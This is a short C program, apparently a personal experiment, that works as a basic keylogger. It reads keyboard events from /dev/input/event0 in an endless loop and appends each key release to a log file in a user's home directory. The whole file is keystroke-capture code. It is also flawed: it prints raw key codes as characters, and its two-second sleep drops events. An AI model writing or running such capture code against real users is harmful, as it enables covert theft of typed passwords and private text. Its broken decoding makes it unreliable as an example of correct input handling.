#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
 
#define LOGFILE "/home/arya/cool-stuff/logfile.txt"
 
int main(int argc, char* argv[])
{
    struct input_event ev;
    int fd = open("/dev/input/event0", O_RDONLY);
    FILE *fp;
    fp = fopen(LOGFILE, "a");
 
    while(1)
    {
        read(fd, &ev, sizeof(ev));
        if ((ev.type == EV_KEY) && (ev.value == 0))
        {
	    	fprintf(fp, "%c\n", ev.code);
            printf("%c\n", ev.code);
        }

	sleep(2);
    }
}
